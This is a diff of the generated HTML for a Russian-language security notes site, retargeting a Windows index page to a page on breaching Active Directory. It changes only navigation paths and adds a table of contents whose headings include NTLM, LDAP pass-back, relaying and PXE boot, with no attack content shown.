@@ -12,28 +12,28 @@
         <meta name="author" content="Dmitrii Ivanov">
       
       
-        <link rel="canonical" href="https://ivanovds.ru/Windows/">
+        <link rel="canonical" href="https://ivanovds.ru/Windows/Active_Directory/breaching_ad/">
       
       
-        <link rel="prev" href="../Linux/Linux_commands/">
+        <link rel="prev" href="../">
       
       
-        <link rel="next" href="Active_Directory/">
+        <link rel="next" href="../../Alternate_Data_Streams/">
       
       
-      <link rel="icon" href="../images/favicon.png">
+      <link rel="icon" href="../../../images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.4.2">
     
     
       
-        <title>Windows - ivanovds.ru</title>
+        <title>Проникновение в Active Directory - ivanovds.ru</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.d451bc0e.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.d451bc0e.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.a5377069.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.a5377069.min.css">
       
       
 
@@ -52,7 +52,7 @@
       
     
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
   
@@ -91,7 +91,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#windows-notes-and-tips" class="md-skip">
+        <a href="#active-directory" class="md-skip">
           Перейти к содержанию
         </a>
       
@@ -107,9 +107,9 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Верхний колонтитул">
-    <a href=".." title="ivanovds.ru" class="md-header__button md-logo" aria-label="ivanovds.ru" data-md-component="logo">
+    <a href="../../.." title="ivanovds.ru" class="md-header__button md-logo" aria-label="ivanovds.ru" data-md-component="logo">
       
-  <img src="../assets/logo.png" alt="logo">
+  <img src="../../../assets/logo.png" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -126,7 +126,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Windows
+              Проникновение в Active Directory
             
           </span>
         </div>
@@ -221,7 +221,7 @@
     
     
       <li class="md-tabs__item">
-        <a href=".." class="md-tabs__link">
+        <a href="../../.." class="md-tabs__link">
           
   
     
@@ -241,7 +241,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../CyberSec/" class="md-tabs__link">
+        <a href="../../../CyberSec/" class="md-tabs__link">
           
   
     
@@ -261,7 +261,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../CTF/" class="md-tabs__link">
+        <a href="../../../CTF/" class="md-tabs__link">
           
   
     
@@ -281,7 +281,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../Linux/" class="md-tabs__link">
+        <a href="../../../Linux/" class="md-tabs__link">
           
   
     
@@ -303,7 +303,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="./" class="md-tabs__link">
+        <a href="../../" class="md-tabs__link">
           
   
     
@@ -323,7 +323,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../Technologies/" class="md-tabs__link">
+        <a href="../../../Technologies/" class="md-tabs__link">
           
   
     
@@ -343,7 +343,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../Documents/" class="md-tabs__link">
+        <a href="../../../Documents/" class="md-tabs__link">
           
   
     
@@ -361,7 +361,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../disclaimer/" class="md-tabs__link">
+      <a href="../../../disclaimer/" class="md-tabs__link">
         
   
     
@@ -378,7 +378,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../Update_log/" class="md-tabs__link">
+      <a href="../../../Update_log/" class="md-tabs__link">
         
   
     
@@ -418,9 +418,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Навигация" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="ivanovds.ru" class="md-nav__button md-logo" aria-label="ivanovds.ru" data-md-component="logo">
+    <a href="../../.." title="ivanovds.ru" class="md-nav__button md-logo" aria-label="ivanovds.ru" data-md-component="logo">
       
-  <img src="../assets/logo.png" alt="logo">
+  <img src="../../../assets/logo.png" alt="logo">
 
     </a>
     ivanovds.ru
@@ -457,7 +457,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href=".." class="md-nav__link ">
+            <a href="../../.." class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -542,7 +542,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/" class="md-nav__link ">
+            <a href="../../../CyberSec/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -574,7 +574,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Terms_and_definitions/" class="md-nav__link">
+      <a href="../../../CyberSec/Terms_and_definitions/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -594,7 +594,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/SecurityPrinciples/" class="md-nav__link">
+      <a href="../../../CyberSec/SecurityPrinciples/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -614,7 +614,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Cyber_Kill_Chain/" class="md-nav__link">
+      <a href="../../../CyberSec/Cyber_Kill_Chain/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -634,7 +634,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Threat_modeling/" class="md-nav__link">
+      <a href="../../../CyberSec/Threat_modeling/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -654,7 +654,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/vulnerabilities/" class="md-nav__link">
+      <a href="../../../CyberSec/vulnerabilities/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -674,7 +674,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_specialists/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_specialists/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -694,7 +694,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Security_Operation_Center_%28SOC%29/" class="md-nav__link">
+      <a href="../../../CyberSec/Security_Operation_Center_%28SOC%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -714,7 +714,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Useful_Information/" class="md-nav__link">
+      <a href="../../../CyberSec/Useful_Information/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -734,7 +734,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Useful_Links/" class="md-nav__link">
+      <a href="../../../CyberSec/Useful_Links/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -780,7 +780,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/CyberSec_Frameworks/" class="md-nav__link ">
+            <a href="../../../CyberSec/CyberSec_Frameworks/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -812,7 +812,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/nist/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/nist/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -832,7 +832,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/GRC/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/GRC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -896,7 +896,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/CyberSec_Frameworks/OWASP/" class="md-nav__link ">
+            <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -928,7 +928,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Broken_Access_Control/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Broken_Access_Control/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -948,7 +948,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Cryptographic_failures/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Cryptographic_failures/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -968,7 +968,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Injection/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Injection/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -988,7 +988,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/SQLi/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/SQLi/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1008,7 +1008,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/XSS/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/XSS/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1028,7 +1028,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/insecure_design/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/insecure_design/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1048,7 +1048,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Security_Misconfiguration/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Security_Misconfiguration/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1068,7 +1068,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Broken_Authentication/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Broken_Authentication/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1088,7 +1088,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/Insecure_Deserialization/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/Insecure_Deserialization/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1108,7 +1108,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/SSRF/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/SSRF/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1128,7 +1128,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/logging_and_monitoring/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/logging_and_monitoring/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1148,7 +1148,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/CyberSec_Frameworks/OWASP/XML_External_Entity_%28Security_misconfiguration%29/" class="md-nav__link">
+      <a href="../../../CyberSec/CyberSec_Frameworks/OWASP/XML_External_Entity_%28Security_misconfiguration%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1210,7 +1210,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/Penetration_testing/" class="md-nav__link ">
+            <a href="../../../CyberSec/Penetration_testing/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1242,7 +1242,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Penetration_testing/Privilege_escalation/" class="md-nav__link">
+      <a href="../../../CyberSec/Penetration_testing/Privilege_escalation/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1262,7 +1262,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Penetration_testing/Reverse_shell/" class="md-nav__link">
+      <a href="../../../CyberSec/Penetration_testing/Reverse_shell/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1282,7 +1282,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Penetration_testing/Upload_payload/" class="md-nav__link">
+      <a href="../../../CyberSec/Penetration_testing/Upload_payload/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1332,7 +1332,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/web_applications/" class="md-nav__link ">
+            <a href="../../../CyberSec/web_applications/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1364,7 +1364,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/web_applications/web_vulns/" class="md-nav__link">
+      <a href="../../../CyberSec/web_applications/web_vulns/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1444,7 +1444,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/Tools/" class="md-nav__link ">
+            <a href="../../../CyberSec/Tools/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1476,7 +1476,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/Burp_Suite/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/Burp_Suite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1496,7 +1496,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/curl/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/curl/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1516,7 +1516,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/feroxbuster/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/feroxbuster/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1536,7 +1536,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/ffuf/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/ffuf/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1556,7 +1556,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/gobuster/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/gobuster/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1576,7 +1576,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/hash-id/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/hash-id/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1596,7 +1596,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/Hydra/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/Hydra/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1616,7 +1616,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/John_the_ripper/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/John_the_ripper/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1636,7 +1636,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/Metasploit/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/Metasploit/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1656,7 +1656,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/netcat_nc/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/netcat_nc/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1676,7 +1676,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/nikto/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/nikto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1696,7 +1696,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/nmap/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/nmap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1716,7 +1716,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/rubeus/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/rubeus/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1736,7 +1736,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/socat/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/socat/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1756,7 +1756,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/wireshark/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/wireshark/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1776,7 +1776,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Tools/WPScan/" class="md-nav__link">
+      <a href="../../../CyberSec/Tools/WPScan/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1826,7 +1826,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CyberSec/Network_security/" class="md-nav__link ">
+            <a href="../../../CyberSec/Network_security/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1858,7 +1858,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CyberSec/Network_security/ARP_spoofing/" class="md-nav__link">
+      <a href="../../../CyberSec/Network_security/ARP_spoofing/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1944,7 +1944,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../CTF/" class="md-nav__link ">
+            <a href="../../../CTF/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1976,7 +1976,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/agent_sudo/" class="md-nav__link">
+      <a href="../../../CTF/agent_sudo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1996,7 +1996,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/bounty_hacker/" class="md-nav__link">
+      <a href="../../../CTF/bounty_hacker/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2016,7 +2016,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/attacktive_directory/" class="md-nav__link">
+      <a href="../../../CTF/attacktive_directory/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2036,7 +2036,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Basic_Pentesting/" class="md-nav__link">
+      <a href="../../../CTF/Basic_Pentesting/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2056,7 +2056,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Kenoby/" class="md-nav__link">
+      <a href="../../../CTF/Kenoby/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2076,7 +2076,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Lazy_admin/" class="md-nav__link">
+      <a href="../../../CTF/Lazy_admin/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2096,7 +2096,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/MrRobot/" class="md-nav__link">
+      <a href="../../../CTF/MrRobot/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2116,7 +2116,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Pickle_Rick/" class="md-nav__link">
+      <a href="../../../CTF/Pickle_Rick/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2136,7 +2136,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/root_me/" class="md-nav__link">
+      <a href="../../../CTF/root_me/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2156,7 +2156,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Simple_CTF/" class="md-nav__link">
+      <a href="../../../CTF/Simple_CTF/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2176,7 +2176,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Skynet/" class="md-nav__link">
+      <a href="../../../CTF/Skynet/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2196,7 +2196,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Steel_Mountain/" class="md-nav__link">
+      <a href="../../../CTF/Steel_Mountain/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2216,7 +2216,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/tomghost/" class="md-nav__link">
+      <a href="../../../CTF/tomghost/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2236,7 +2236,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../CTF/Upload_Vulnerabilities/" class="md-nav__link">
+      <a href="../../../CTF/Upload_Vulnerabilities/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2306,7 +2306,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../Linux/" class="md-nav__link ">
+            <a href="../../../Linux/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2338,7 +2338,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Bash_startup_files/" class="md-nav__link">
+      <a href="../../../Linux/Bash_startup_files/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2358,7 +2358,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Disks/" class="md-nav__link">
+      <a href="../../../Linux/Disks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2378,7 +2378,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Kernel/" class="md-nav__link">
+      <a href="../../../Linux/Kernel/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2398,7 +2398,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Other_necessery_things/" class="md-nav__link">
+      <a href="../../../Linux/Other_necessery_things/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2418,7 +2418,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Processes/" class="md-nav__link">
+      <a href="../../../Linux/Processes/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2438,7 +2438,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Shell_scripting/" class="md-nav__link">
+      <a href="../../../Linux/Shell_scripting/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2458,7 +2458,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Some_useful_files_and_directories/" class="md-nav__link">
+      <a href="../../../Linux/Some_useful_files_and_directories/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2478,7 +2478,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Users/" class="md-nav__link">
+      <a href="../../../Linux/Users/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2498,7 +2498,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Variables/" class="md-nav__link">
+      <a href="../../../Linux/Variables/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2518,7 +2518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/Linux_commands/" class="md-nav__link">
+      <a href="../../../Linux/Linux_commands/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2584,7 +2584,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="./" class="md-nav__link md-nav__link--active">
+            <a href="../../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2595,7 +2595,7 @@
             </a>
             
               
-              <label class="md-nav__link md-nav__link--active" for="__nav_5" id="__nav_5_label" tabindex="">
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
                 <span class="md-nav__icon md-icon"></span>
               </label>
             
@@ -2614,6 +2614,8 @@
                 
   
   
+    
+  
   
     
     
@@ -2628,17 +2630,17 @@
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" checked>
         
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="Active_Directory/" class="md-nav__link ">
+            <a href="../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2655,7 +2657,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5_2">
             <span class="md-nav__icon md-icon"></span>
             Active Directory
@@ -2668,9 +2670,29 @@
                 
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="Active_Directory/breaching_ad/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Проникновение в Active Directory
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -2679,6 +2701,181 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#osint" class="md-nav__link">
+    OSINT и фишинг
+  </a>
+  
+    <nav class="md-nav" aria-label="OSINT и фишинг">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#osint_1" class="md-nav__link">
+    OSINT
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm" class="md-nav__link">
+    NTLM аутентификация
+  </a>
+  
+    <nav class="md-nav" aria-label="NTLM аутентификация">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-netntlm" class="md-nav__link">
+    NTLM и NetNTLM
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-spraying" class="md-nav__link">
+    Брутфорс логинов и password spraying
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    LDAP
+  </a>
+  
+    <nav class="md-nav" aria-label="LDAP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-bind-credentials" class="md-nav__link">
+    LDAP bind credentials
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-pass-back-attacks" class="md-nav__link">
+    LDAP Pass-back Attacks
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Ретрансляция аутентификации
+  </a>
+  
+    <nav class="md-nav" aria-label="Ретрансляция аутентификации">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netntlm-llmnr-nbt-ns-wapd" class="md-nav__link">
+    Перехват NetNTLM сведений из LLMNR, NBT-NS, WAPD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Перехват challenge
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-deployment-toolkit" class="md-nav__link">
+    Использование Microsoft Deployment Toolkit
+  </a>
+  
+    <nav class="md-nav" aria-label="Использование Microsoft Deployment Toolkit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mdt-sccm" class="md-nav__link">
+    MDT и SCCM
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pxe-boot" class="md-nav__link">
+    PXE Boot
+  </a>
+  
+    <nav class="md-nav" aria-label="PXE Boot">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pxe-boot_1" class="md-nav__link">
+    Извлечение данных из PXE Boot образа
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Конфигурационные файлы
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Как со всем этим бороться?
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2698,7 +2895,7 @@
   
   
     <li class="md-nav__item">
